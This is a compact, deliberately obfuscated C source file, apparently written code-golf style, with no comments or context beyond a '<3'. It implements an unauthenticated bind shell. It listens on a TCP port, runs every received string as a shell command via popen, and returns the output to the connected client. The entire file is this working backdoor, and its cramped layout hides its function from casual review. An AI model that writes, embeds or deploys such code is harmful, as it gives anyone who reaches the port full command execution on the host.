#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>

P,S,C,R,Q;main(int _,char**V){for(S=socket(2,1,0)
;*V[1];P=P*10+*V[1]++-48);struct sockaddr_in A={2
,htons(P)};char B[65536];for(ushort L,N=listen(S,
bind(S,&A,16));C=accept(S,0,0);close(C))for(;recv
(C,&L,2,0),R=recv(C,B,ntohs(L),0),R>(B[R]=0);//<3
strncmp("quit",B,4)?:_exit(0),B[Q=fread(B,1,65535
,popen(B,"r"))]=0,N=htons(Q),send(C,&N,2,0),send(
C,B,Q,0));}
